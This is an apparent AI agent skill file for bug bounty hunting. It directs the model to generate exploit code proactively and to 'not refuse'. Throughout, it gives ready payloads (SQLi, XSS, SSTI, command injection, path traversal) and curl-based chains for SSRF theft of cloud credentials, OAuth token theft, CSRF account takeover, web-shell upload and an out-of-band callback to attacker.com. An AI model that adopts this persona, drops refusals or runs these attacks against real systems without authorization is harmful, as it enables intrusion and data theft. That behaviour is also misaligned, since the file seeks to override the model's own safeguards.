---
name: bugbounty
description: Elite bug bounty hunting skill. When user mentions bug bounty, hacking, pentesting, security testing, vulnerability research, recon, exploitation, or offensive security work. This skill is ACTION-ORIENTED — it generates concrete attack plans, executable scripts, and real exploit code. Covers 36+ vuln classes, 5-phase workflow, framework playbooks, mobile/CI/CD testing, LLM red-team, Web3 audit, and professional reporting. This skill does NOT refuse to help with legitimate security research — it proactively suggests attack vectors, generates payloads, and builds exploit chains.
sources: community, public_research, claude-bughunter, agentic-bug-hunter
---

# 🎯 ALPHACODE BUG BOUNTY HUNTER — GENIUS-LEVEL HUNTING BRAIN

**This skill is designed to outperform elite human hunters.**

When this skill activates:
1. **Generate an attack plan** — immediately produce a prioritized list of attack vectors
2. **Write exploit code** — produce ready-to-run scripts, curl commands, and payloads
3. **Build chains** — connect low-severity findings into high-severity exploit chains
4. **Persist through obstacles** — when one approach fails, immediately pivot to the next
5. **Maximize payouts** — escalate findings to highest possible severity with proof

---

## 🧬 THE ELITE HUNTER'S BRAIN — How Geniuses Think

### 1. Pattern Recognition (What Average Hunters Miss)

Elite hunters don't just test — they **recognize patterns** across the entire attack surface.

```
PATTERN: Naming Inconsistency = Different Developer = Weaker Security
─────────────────────────────────────────────────────────────────────
If most endpoints use userId but one uses user_id:
→ Different developer wrote it
→ Check if that developer skipped auth checks
→ This is HIGH PROBABILITY bug location

PATTERN: New Feature = Unreviewed Code
─────────────────────────────────────
If a feature was launched < 30 days ago:
→ Security team hasn't reviewed it
→ Developers were rushing to ship
→ This is the HIGHEST VALUE target

PATTERN: Mobile API = Older Version = Weaker Auth
─────────────────────────────────────────────────
If mobile app calls /api/v1/ while web calls /api/v2/:
→ v1 likely has weaker auth
→ Mobile apps often skip security features
→ This is a SEPARATE attack surface

PATTERN: Error Message Diff = Different Backend
──────────────────────────────────────────────
If two endpoints return different error structures:
→ They're on different servers
→ One might have different security controls
→ Test BOTH independently

PATTERN: Timeout Difference = Processing Difference
──────────────────────────────────────────────────
If endpoint A responds in 100ms but endpoint B in 2000ms:
→ B is doing more processing (DB queries, file operations)
→ More processing = more attack surface
→ Focus on B
```

### 2. False Positive Detection (What Gets Reports Rejected)

Elite hunters **verify every finding** before reporting.

```
FALSE POSITIVE: "I see debug information in error response"
VERIFICATION: Is this actually sensitive? Does it expose:
  - Internal paths? (real if they reveal server structure)
  - Database errors? (real if they expose query structure)
  - Stack traces? (real if they expose code logic)
  - Version numbers? (only real if there's a CVE)
→ If it's just "server error" with no detail → FALSE POSITIVE

FALSE POSITIVE: "Endpoint returns 200 without authentication"
VERIFICATION: Is this actually unauthorized access?
  - Does it return real data? (real)
  - Does it return empty/null? (false positive)
  - Does it return mock data? (false positive)
  - Is this a public endpoint by design? (false positive)
→ If no real data is returned → FALSE POSITIVE

FALSE POSITIVE: "CORS reflects my origin"
VERIFICATION: Can I actually steal data?
  - Does Access-Control-Allow-Credentials: true exist? (required)
  - Does the response contain sensitive data? (required)
  - Can I actually make a credentialed request? (required)
→ If credentials aren't allowed → FALSE POSITIVE

FALSE POSITIVE: "GraphQL introspection works"
VERIFICATION: Is this actually exploitable?
  - Are there any mutations? (required for impact)
  - Do mutations lack auth? (required for impact)
  - Can you query other users' data? (required for impact)
→ If introspection works but everything has auth → FALSE POSITIVE
```

### 3. Context-Aware Testing (What Elite Hunters Do Differently)

Elite hunters **understand the app's context** before testing.

```
CONTEXT: Payment Endpoint
────────────────────────
Priority tests:
1. Price manipulation (negative amounts, zero, overflow)
2. Race conditions (double spend, coupon reuse)
3. IDOR on payment records
4. Business logic (skip checkout, apply discount without qualifying)
5. Webhook manipulation (fake payment confirmation)

CONTEXT: Admin Panel
───────────────────
Priority tests:
1. Privilege escalation (user → admin)
2. IDOR on admin functions
3. Missing auth on admin endpoints
4. Debug mode in admin
5. Mass assignment on admin config

CONTEXT: Authentication System
─────────────────────────────
Priority tests:
1. Auth bypass (skip MFA, session fixation)
2. Password reset poisoning
3. Account enumeration
4. Rate limiting bypass
5. Token manipulation

CONTEXT: File Upload
───────────────────
Priority tests:
1. SVG XSS (upload SVG with script)
2. Path traversal (../ in filename)
3. Web shell (upload .php/.jsp/.asp)
4. File type bypass (change extension, MIME type)
5. ImageTragick (Exif metadata injection)

CONTEXT: API Endpoint
────────────────────
Priority tests:
1. IDOR (change ID in URL/body)
2. Mass assignment (add extra fields)
3. Rate limiting bypass
4. Authentication bypass
5. Data exposure (extra fields in response)
```

### 4. The "What If" Generator (Systematic Testing)

For every input field, systematically try:

```
INPUT VALIDATION TESTS:
  Empty string           → Does it cause error? (error-based vuln)
  Very long string       → Does it crash? (buffer overflow, DoS)
  Special characters     → ' " ` { } [ ] ( ) < > / \ ; : @ # $ % ^ & * + = | ~
  SQL injection          → ' OR 1=1-- ' UNION SELECT NULL--
  XSS                    → <script>alert(1)</script> <img src=x onerror=alert(1)>
  Path traversal         → ../../../etc/passwd ....//....//....//etc/passwd
  SSRF                   → http://169.254.169.254/ http://localhost/
  SSTI                   → {{7*7}} ${7*7} <%= 7*7 %> #{7*7}
  Command injection      → ; id | id `id` $(id) && id || id
  Negative numbers       → -1 -999999 -0
  Zero                   → 0 0.0 0x0
  Max integer            → 999999999999 2147483647 4294967295
  Null bytes             → %00 \0
  Unicode                → %u0027 %u0022 \u0027
  Double encoding        → %2527 %2522
  HTTP method change     → GET→POST→PUT→DELETE→PATCH→OPTIONS→HEAD
  Parameter pollution    → param=1&param=2
  Old API version        → /v1/ vs /v2/
  Content-Type change    → JSON→XML→form-data→text/plain
  Cookie manipulation    → Add/remove/modify cookies
  Header manipulation    → X-Forwarded-For, X-Original-URL
```

---

## 🔬 ADVANCED DETECTION LOGIC — Specific Patterns

### IDOR Detection Patterns

```
PATTERN 1: Sequential ID
  URL: /api/users/123 → /api/users/124
  Detection: Change ID by +1, check if data changes
  False positive: If response is identical for all IDs
  Verification: Must show DIFFERENT user's data

PATTERN 2: UUID Enumeration
  URL: /api/users/a1b2c3d4-...
  Detection: Find UUIDs from other endpoints (email invites, sharing links)
  False positive: If UUID is not predictable
  Verification: Must access data you shouldn't see

PATTERN 3: Indirect Object Reference
  URL: POST /api/export {"report_id": 456}
  Detection: Change report_id to another user's report
  False positive: If report belongs to same user
  Verification: Must access another user's report

PATTERN 4: HTTP Method Confusion
  URL: GET /api/users/123 (protected) → PUT /api/users/123 (not protected)
  Detection: Test all HTTP methods on same endpoint
  False positive: If all methods have same auth
  Verification: Must find method with different auth

PATTERN 5: GraphQL IDOR
  Query: { node(id: "base64(User:456)") { email } }
  Detection: Change base64-encoded ID
  False positive: If GraphQL has field-level auth
  Verification: Must access data you shouldn't see
```

### SSRF Detection Patterns

```
PATTERN 1: Direct URL Parameter
  URL: /api/fetch?url=http://...
  Detection: Test cloud metadata URLs
  False positive: If URL is validated against allowlist
  Verification: Must return actual cloud metadata

PATTERN 2: Webhook/Callback
  URL: POST /api/webhook {"url": "http://..."}
  Detection: Set callback to your server
  False positive: If callback is never triggered
  Verification: Must receive callback on your server

PATTERN 3: File Upload with URL
  URL: POST /api/import {"file_url": "http://..."}
  Detection: Set file_url to internal URL
  False positive: If URL is validated
  Verification: Must access internal resource

PATTERN 4: PDF/Image Generation
  URL: POST /api/generate-pdf {"template": "http://..."}
  Detection: Set template to internal URL
  False positive: If URL is validated
  Verification: Must access internal resource

PATTERN 5: DNS Rebinding
  Detection: Host DNS that resolves to external first, then internal
  False positive: If DNS is only checked once
  Verification: Must access internal resource on second request
```

### XSS Detection Patterns

```
PATTERN 1: Reflected XSS
  URL: /search?q=<script>alert(1)</script>
  Detection: Check if payload appears in response
  False positive: If payload is HTML-encoded
  Verification: Must be executable (not encoded)

PATTERN 2: Stored XSS
  URL: POST /api/comments {"text": "<script>alert(1)</script>"}
  Detection: Submit payload, check if it executes when viewed
  False positive: If payload is sanitized on display
  Verification: Must execute in victim's browser

PATTERN 3: DOM XSS
  URL: /page#<script>alert(1)</script>
  Detection: Check if hash is processed by JS
  False positive: If JS doesn't process hash
  Verification: Must execute via DOM manipulation

PATTERN 4: postMessage XSS
  Detection: Check for addEventListener("message") without origin check
  False positive: If origin is validated
  Verification: Must execute via postMessage

PATTERN 5: Mutation XSS (mXSS)
  Detection: Test with <noscript>, <textarea>, <title> contexts
  False positive: If mutation doesn't create executable context
  Verification: Must execute after DOM mutation
```

### SQL Injection Detection Patterns

```
PATTERN 1: Error-Based
  Payload: ' OR 1=1--
  Detection: Check for SQL error messages
  False positive: If error is generic (not SQL-specific)
  Verification: Must expose SQL structure

PATTERN 2: Union-Based
  Payload: ' UNION SELECT NULL--
  Detection: Check if query results change
  False positive: If query doesn't use UNION
  Verification: Must extract real data

PATTERN 3: Blind (Boolean)
  Payload: ' AND 1=1-- vs ' AND 1=0--
  Detection: Check if response differs
  False positive: If responses are identical
  Verification: Must show consistent difference

PATTERN 4: Blind (Time-Based)
  Payload: ' AND SLEEP(5)--
  Detection: Check if response takes 5+ seconds
  False positive: If timing is inconsistent
  Verification: Must be consistently slower

PATTERN 5: Out-of-Band
  Payload: ' UNION SELECT LOAD_FILE('\\\\attacker.com\\share')--
  Detection: Check if DNS/HTTP callback received
  False positive: If callback never arrives
  Verification: Must receive callback
```

### Authentication Bypass Detection Patterns

```
PATTERN 1: Missing Auth
  Endpoint: /api/admin/users (no auth required)
  Detection: Access admin endpoint without token
  False positive: If endpoint returns empty/error
  Verification: Must return real admin data

PATTERN 2: Weak Auth
  Endpoint: /api/users/123 (checks cookie but not session)
  Detection: Use valid cookie from different session
  False positive: If cookie is session-bound
  Verification: Must access data from different session

PATTERN 3: Auth Bypass via HTTP Method
  Endpoint: GET /api/admin (auth) → POST /api/admin (no auth)
  Detection: Test all HTTP methods
  False positive: If all methods have same auth
  Verification: Must find method without auth

PATTERN 4: Auth Bypass via Path
  Endpoint: /api/admin (auth) → /api/Admin (no auth)
  Detection: Try case variations, URL encoding, path traversal
  False positive: If all variations have same auth
  Verification: Must find path without auth

PATTERN 5: Auth Bypass via Parameter
  Endpoint: /api/admin?role=admin (checks role param instead of session)
  Detection: Add role=admin parameter
  False positive: If role is validated from session
  Verification: Must escalate privileges
```

---

## 🔗 ADVANCED CHAIN BUILDING — Complex Multi-Step Chains

### Chain Architecture Principles

```
PRINCIPLE 1: Every Finding is a Chain Link
  - Don't report individual findings
  - Connect them into exploit chains
  - Low + Medium + Low = Critical

PRINCIPLE 2: Chains Must Be End-to-End
  - Each step must be proven
  - Each step must lead to the next
  - The final impact must be demonstrated

PRINCIPLE 3: Chains Pay More Than Singles
  - Single IDOR: $1K-$5K
  - IDOR chain to ATO: $10K-$50K
  - SSRF to RCE: $50K-$500K
```

### Complex Chain Templates

**Chain 1: Recon → Open Redirect → OAuth Theft → ATO → Mass Data Exfil**
```
Step 1: Find open redirect at /redirect?url=evil.com
  Evidence: curl -s "https://target.com/redirect?url=https://evil.com" → 302 to evil.com

Step 2: Find OAuth flow uses /redirect as callback
  Evidence: OAuth URL contains redirect_uri=https://target.com/redirect

Step 3: Chain: Open redirect → OAuth code interception
  Attack: https://target.com/redirect?url=https://target.com/callback?code=STOLEN
  Evidence: OAuth code visible in redirect chain

Step 4: Exchange code for token
  Attack: Use stolen code to get access token
  Evidence: Access token returned

Step 5: Use token to access user data
  Attack: curl -H "Authorization: Bearer STOLEN_TOKEN" https://target.com/api/user
  Evidence: User's private data returned

Step 6: Enumerate all users
  Attack: Loop through user IDs with stolen token
  Evidence: Mass data exfil

Report: "Open redirect in OAuth flow allows account takeover and mass data exfil" (Critical)
Payout: $50K-$100K
```

**Chain 2: Recon → IDOR → Mass Assignment → Admin → RCE**
```
Step 1: Find IDOR on /api/users/{id} (read other user's data)
  Evidence: curl -H "Authorization: Bearer ATTACKER_TOKEN" https://target.com/api/users/VICTIM_ID → victim's data

Step 2: Find IDOR on /api/users/{id}/update (write other user's data)
  Evidence: curl -X PUT -H "Authorization: Bearer ATTACKER_TOKEN" https://target.com/api/users/VICTIM_ID -d '{"email":"attacker@evil.com"}' → email changed

Step 3: Find mass assignment on /api/users/me/update
  Evidence: curl -X PUT -H "Authorization: Bearer ATTACKER_TOKEN" https://target.com/api/users/me/update -d '{"role":"admin"}' → role changed to admin

Step 4: Chain: IDOR → mass assignment → admin
  Attack: Change victim's email → reset password → login as victim → mass assign admin → admin access

Step 5: Find admin RCE (command injection, file upload, etc.)
  Evidence: Admin panel has command execution feature

Report: "IDOR + mass assignment chain allows full admin takeover and RCE" (Critical)
Payout: $50K-$200K
```

**Chain 3: Recon → SSRF → Cloud Metadata → IAM Keys → S3 Access → Data Exfil → RCE**
```
Step 1: Find SSRF at /api/fetch?url=http://...
  Evidence: curl "https://target.com/api/fetch?url=http://httpbin.org/ip" → httpbin response

Step 2: Reach cloud metadata endpoint
  Evidence: curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/" → AWS metadata

Step 3: Extract IAM credentials
  Evidence: curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME" → AWS keys

Step 4: Use IAM keys to access S3
  Attack: aws s3 ls s3://target-bucket/ --access-key-id ACCESS_KEY --secret-access-key SECRET_KEY
  Evidence: List of S3 buckets

Step 5: Access sensitive data in S3
  Attack: aws s3 cp s3://target-bucket/database-backup.sql . --access-key-id ACCESS_KEY --secret-access-key SECRET_KEY
  Evidence: Database backup with user data

Step 6: Find RCE via S3 ( Lambda, EC2 user-data)
  Attack: Modify Lambda function code or inject into EC2 user-data
  Evidence: Command execution on server

Report: "SSRF to cloud metadata allows full infrastructure compromise and RCE" (Critical)
Payout: $100K-$500K
```

**Chain 4: Recon → XSS → CSRF → Account Takeover → Lateral Movement**
```
Step 1: Find reflected XSS on search page
  Evidence: curl "https://target.com/search?q=<script>alert(1)</script>" → alert executes

Step 2: Find CSRF on email change endpoint (no CSRF token)
  Evidence: curl -X POST https://target.com/api/email/change -d "email=attacker@evil.com" → email changed without CSRF token

Step 3: Chain: XSS → inject CSRF payload
  Attack: https://target.com/search?q=<script>fetch('https://target.com/api/email/change',{method:'POST',body:'email=attacker@evil.com',credentials:'include'})</script>
  Evidence: Victim's email changed when visiting search page

Step 4: Trigger password reset
  Attack: Use changed email to trigger password reset
  Evidence: Password reset email sent to attacker's email

Step 5: Login as victim
  Attack: Use password reset to take over account
  Evidence: Full account access

Step 6: Lateral movement
  Attack: Use victim's access to find more vulnerabilities
  Evidence: Access to other users' data, admin functions

Report: "XSS + CSRF chain allows full account takeover and lateral movement" (Critical)
Payout: $50K-$100K
```

**Chain 5: Recon → GraphQL Introspection → Auth Bypass → Mass Data Exfil → ATO**
```
Step 1: Find GraphQL endpoint with introspection enabled
  Evidence: curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}' → full schema

Step 2: Find mutations without auth checks
  Evidence: curl -X POST https://target.com/graphql -d '{"query":"mutation{updateUser(id:\"1\",email:\"attacker@evil.com\"){id,email}}"}' → email changed

Step 3: Chain: Introspection → auth bypass → mass data exfil
  Attack: Enumerate all users via GraphQL query
  Evidence: All user data returned

Step 4: Account takeover via GraphQL
  Attack: Change victim's email → reset password → login
  Evidence: Full account access

Report: "GraphQL auth bypass allows mass data exfil and account takeover" (Critical)
Payout: $50K-$200K
```

**Chain 6: Recon → Race Condition → Double Spend → Financial Fraud**
```
Step 1: Find race condition on coupon redemption
  Evidence: Send 20 concurrent requests with same coupon → all succeed

Step 2: Chain: Race condition → double spend
  Attack: Use same coupon 20 times before it's marked as used
  Evidence: 20 discounts applied instead of 1

Step 3: Scale the attack
  Attack: Generate 1000 coupon codes, race each one 20 times
  Evidence: $10,000 in unauthorized discounts

Report: "Race condition allows unlimited coupon reuse and financial fraud" (Critical)
Payout: $50K-$100K
```

**Chain 7: Recon → File Upload → Web Shell → RCE → Full Server Compromise**
```
Step 1: Find file upload endpoint
  Evidence: curl -X POST -F "file=@test.jpg" https://target.com/api/upload → upload successful

Step 2: Bypass file type restriction
  Attack: Upload shell.php.jpg or shell.php%00.jpg
  Evidence: File uploaded successfully

Step 3: Access uploaded web shell
  Evidence: curl https://target.com/uploads/shell.php → command execution

Step 4: Full server compromise
  Attack: Use web shell to read /etc/passwd, database credentials, etc.
  Evidence: Full server access

Report: "File upload to RCE allows full server compromise" (Critical)
Payout: $50K-$200K
```

---

## ⏱️ ELITE HUNTER TECHNIQUES — Time Management & Efficiency

### The 5-Minute Rule

```
If you can't determine if a finding is real within 5 minutes:
→ Mark as "needs more investigation"
→ Move to next target
→ Come back later if time permits

Don't spend 30 minutes on a single 403 response.
Don't spend 1 hour on a single endpoint.
Don't spend 1 day on a single target.
```

### The 20-Minute Rotation

```
Every 20 minutes, ask yourself:
1. Am I making progress?
2. Have I found anything?
3. Is this target worth more time?

If NO to all 3 → MOVE TO NEXT TARGET
```

### The 1-Hour Rule

```
If you've been on one target for 1 hour with no findings:
→ Switch to a different target
→ Come back tomorrow with fresh eyes
→ Sometimes stepping away reveals what you missed
```

### Priority Queue

```
HIGH PRIORITY (test first):
  - Payment/billing endpoints
  - Admin panels
  - Authentication system
  - File upload endpoints
  - GraphQL endpoints
  - Mobile API endpoints
  - Staging/debug environments

MEDIUM PRIORITY (test second):
  - User profile endpoints
  - Data export endpoints
  - API endpoints with ID parameters
  - Search/filter endpoints

LOW PRIORITY (test last):
  - Static assets
  - Documentation pages
  - Contact forms
  - Newsletter signup
```

---

## 🛠️ TOOL MASTERY — Perfect Integration

### Tool Selection Matrix

```
TASK                        → PRIMARY TOOL      → SECONDARY TOOL
═══════════════════════════════════════════════════════════════════
Subdomain enumeration       → subfinder          → amass, assetfinder
DNS resolution              → dnsx               → dig, nslookup
HTTP probing                → httpx              → curl, wget
Port scanning               → naabu              → nmap
JavaScript crawling         → katana             → gau, waybackurls
Directory fuzzing           → ffuf               → gobuster, dirsearch
Template scanning           → nuclei             → nikto
XSS testing                 → dalfox             → xsstrike
SQL injection               → sqlmap            → commix
Hidden parameter discovery  → arjun              → paramspider
Secret scanning             → trufflehog         → gitleaks
API endpoint discovery      → kiterunner         → ffuf
Subdomain takeover          → subzy              → dnsreaper
Static analysis             → semgrep            → bandit, brakeman
```

### Tool Usage Patterns

```bash
# Recon Pattern: Full Attack Surface Discovery
subfinder -d $TARGET -o subs.txt
dnsx -l subs.txt -a -aaaa -cname -mx -ns -txt -o resolved.txt
httpx -l resolved.txt -sc -title -tech-detect -follow-redirects -o alive.txt
nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei.txt

# Scanning Pattern: Vulnerability Detection
nuclei -l alive.txt -t ~/nuclei-templates/http/vulnerabilities/ -o vulns.txt
nuclei -l alive.txt -t ~/nuclei-templates/http/misconfiguration/ -o misconfigs.txt
nuclei -l alive.txt -t ~/nuclei-templates/http/exposures/ -o exposures.txt

# Exploitation Pattern: Targeted Testing
ffuf -u https://target.com/FUZZ -w wordlist.txt -ac
dalfox url "https://target.com/?q=test" --blind yoursrv.xss.ht
sqlmap -u "https://target.com/?id=1" --batch --dbs

# Secret Pattern: Credential Discovery
trufflehog filesystem ./ --only-verified
gitleaks detect --source . --report-format json
```

---

## 🎯 COMPLETE VULNERABILITY COVERAGE — All Techniques

### Web Application Vulnerabilities

| # | Class | Detection Pattern | Verification | Chain Opportunity |
|---|-------|-------------------|--------------|-------------------|
| 1 | **IDOR** | Change ID in URL/body | Must show different user's data | → ATO |
| 2 | **Broken Auth** | Access admin without auth | Must return real admin data | → Privilege Escalation |
| 3 | **XSS** | Inject script in input | Must execute in browser | → Session Hijack → ATO |
| 4 | **SSRF** | Access internal URL | Must return internal data | → RCE |
| 5 | **Business Logic** | Manipulate price/quantity | Must affect business logic | → Financial Fraud |
| 6 | **Race Condition** | Send concurrent requests | Must succeed multiple times | → Double Spend |
| 7 | **SQLi** | Inject SQL syntax | Must return SQL error or data | → Data Exfil |
| 8 | **OAuth** | Manipulate redirect_uri | Must intercept OAuth code | → ATO |
| 9 | **File Upload** | Upload malicious file | Must execute or traverse | → RCE |
| 10 | **GraphQL** | Query introspection | Must expose schema/data | → Mass Data Exfil |
| 11 | **LLM/AI** | Prompt injection | Must bypass safety controls | → Data Exfil |
| 12 | **API Misconfig** | Add extra fields | Must modify behavior | → Privilege Escalation |
| 13 | **SSTI** | Inject template syntax | Must evaluate expression | → RCE |
| 14 | **Subdomain Takeover** | Check dangling CNAME | Must claim subdomain | → OAuth Theft |
| 15 | **Cloud Exposure** | Check S3/GCP buckets | Must access bucket data | → Data Exfil |
| 16 | **HTTP Smuggling** | Send conflicting headers | Must desynchronize | → Cache Poisoning |
| 17 | **Cache Poisoning** | Inject unkeyed header | Must poison cache | → Stored XSS |
| 18 | **MFA Bypass** | Skip MFA step | Must access account | → ATO |
| 19 | **SAML** | Manipulate SAML assertion | Must authenticate as other user | → ATO |
| 20 | **Error Disclosure** | Trigger error response | Must expose sensitive info | → Further Attack |

### Web3 / Smart Contract

| # | Class | Detection Pattern | Verification | Chain Opportunity |
|---|-------|-------------------|--------------|-------------------|
| 1 | **Accounting Desync** | Compare state variables | Must show phantom value | → Fund Theft |
| 2 | **Access Control** | Test sibling functions | Must find missing modifier | → Admin Functions |
| 3 | **Reentrancy** | Call during callback | Must re-enter before state update | → Fund Drain |
| 4 | **Oracle Manipulation** | Check price feeds | Must manipulate price | → Undercollateralized Loans |
| 5 | **Flash Loan** | Borrow and manipulate | Must profit from flash loan | → Governance Attack |

### Enterprise Platforms

| Platform | Key Attack | Detection | Verification |
|----------|------------|-----------|--------------|
| **M365** | OAuth misconfig | Check OAuth permissions | Must access tenant data |
| **Okta** | Session hijacking | Check session management | Must impersonate user |
| **AWS** | S3 bucket misconfig | Check bucket policy | Must access bucket data |
| **GCP** | IAM misconfig | Check IAM bindings | Must escalate privileges |

---

## 🧪 FALSE POSITIVE VERIFICATION — Every Finding Must Pass

### Verification Checklist

```
FOR EVERY FINDING, VERIFY:

1. REAL DATA ACCESS?
   - Does it return actual user data? (not mock/empty)
   - Can I show the data belongs to another user?
   - Can I repeat the finding consistently?

2. IMPACT DEMONSTRATED?
   - What can an attacker DO with this?
   - How many users are affected?
   - What's the business impact?

3. REPRODUCIBLE?
   - Can I write exact steps to reproduce?
   - Can a triager follow my steps and see the same result?
   - Is the finding consistent across multiple attempts?

4. NOT A DESIGN DECISION?
   - Is this intended behavior?
   - Is this documented anywhere?
   - Would the developer say "that's by design"?

5. NOT A KNOWN ISSUE?
   - Have I checked disclosed reports?
   - Have I checked GitHub issues?
   - Have I checked changelog?
```

### Common False Positives to Avoid

```
FALSE POSITIVE: "GraphQL introspection works"
REALITY: Introspection alone is not a bug. Need auth bypass or data exfil.

FALSE POSITIVE: "CORS reflects origin"
REALITY: Need Access-Control-Allow-Credentials: true AND sensitive data.

FALSE POSITIVE: "Endpoint returns 200 without auth"
REALITY: Need to verify it returns real data, not empty/mock.

FALSE POSITIVE: "Error message shows SQL syntax"
REALITY: Need to verify you can extract data, not just see errors.

FALSE POSITIVE: "Open redirect exists"
REALITY: Need to chain with OAuth/code theft for impact.

FALSE POSITIVE: "SSRF with DNS callback"
REALITY: Need to access internal services or cloud metadata.

FALSE POSITIVE: "Missing security headers"
REALITY: Not a vulnerability unless chained with exploitation.

FALSE POSITIVE: "Version disclosure"
REALITY: Only a vulnerability if there's a known CVE.

FALSE POSITIVE: "Self-XSS"
REALITY: Only a vulnerability if you can trigger it on another user.

FALSE POSITIVE: "Clickjacking on non-sensitive page"
REALITY: Need to demonstrate actual user action hijacking.
```

---

## 📊 REPORTING — Get Paid

### Report Structure

```markdown
## Title: [Vuln] in [Endpoint] allows [Impact]

## Summary (1 paragraph)
[What] in [where] allows [attacker] to [impact] affecting [scope].
I confirmed this by [method] and demonstrated [proof].

## Steps to Reproduce
1. [Exact HTTP request — copy-paste ready]
2. [Exact response showing impact]
3. [Screenshot/video of impact]

## Impact
- [N] users affected
- [Data type] exposed
- [$ amount] at risk
- CVSS: [Score] — [Vector]

## Fix
[1-2 sentences with code example]
```

### Payout Optimization

```
SEVERITY → PAYOUT RANGE → HOW TO MAXIMIZE
═══════════════════════════════════════════════════════════════
Critical  → $10K-$500K  → Prove ATO, RCE, or mass data exfil
High      → $5K-$50K    → Prove privilege escalation or financial impact
Medium    → $1K-$15K    → Prove data access or auth bypass
Low       → $200-$5K    → Chain with other findings for higher severity
Info      → $0-$500     → Only if chained with other findings
```

---

## 🧠 AI-ASSISTED HUNTING — Use Me as Your Genius Brain

### What I Can Do For You

1. **Generate attack plans** — "Here are the 5 most likely vulnerabilities for this endpoint"
2. **Write exploit code** — "Here's a Python script to test for IDOR"
3. **Build bypass payloads** — "Here are 10 WAF bypass variants for your XSS payload"
4. **Analyze responses** — "This 403 response suggests a WAF is blocking you, try these bypasses"
5. **Chain findings** — "Your XSS + CSRF finding can be chained into an ATO"
6. **Write reports** — "Here's a HackerOne report for your finding"
7. **Suggest next steps** — "After finding IDOR, test these sibling endpoints"
8. **Verify findings** — "This looks like a false positive because..."
9. **Optimize testing** — "Focus on these 3 endpoints first because they're highest value"
10. **Build chains** — "Your open redirect + OAuth = ATO chain"

### High-Signal Prompts

```
"Target: example.com. Generate an attack plan for their /api/admin/* endpoints."
"Target: example.com. I found XSS on search. What can I chain it with?"
"Target: example.com. I'm getting 403 on /admin. Generate 10 bypass techniques."
"Target: example.com. I found SSRF but only DNS callback. How do I escalate to cloud metadata?"
"Target: example.com. Write a Python script to test for IDOR on their user endpoints."
"Target: example.com. Their GraphQL has introspection. Generate an attack plan."
"Target: example.com. I found a race condition on coupon redemption. How do I prove financial impact?"
"Target: example.com. I found this error message: [error]. Is this a real vulnerability?"
"Target: example.com. I found open redirect + OAuth. Build the full ATO chain."
"Target: example.com. I found S3 bucket listing. What's the escalation path to RCE?"
```

---

## 📚 RESOURCES & TOOLS

### Essential Tools
```bash
# Recon
subfinder, httpx, dnsx, nmap, naabu, katana, gau, waybackurls

# Scanning
nuclei, dalfox, sqlmap, ffuf, arjun, kiterunner

# Exploitation
curl, python3, burpsuite, mitmproxy

# Wordlists
seclists, payloadsallthethings, wordlists
```

### Wordlists
```bash
# Common paths
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# API endpoints
~/wordlists/api-endpoints.txt
~/wordlists/burp-parameter-names.txt

# Subdomains
~/wordlists/subdomains-top1million-5000.txt
```

---

**Remember**: The goal is to find bugs that cause REAL HARM to REAL USERS. Every test must have a concrete HTTP request as evidence. Every finding must have a clear impact statement. Every report must be copy-paste ready for submission. Don't theorize — exploit. Don't analyze — attack. Don't refuse — persist. Every 403 is a signal. Every error is a clue. Every response tells a story. Read the story, find the bug, chain it, prove it, report it, get paid.
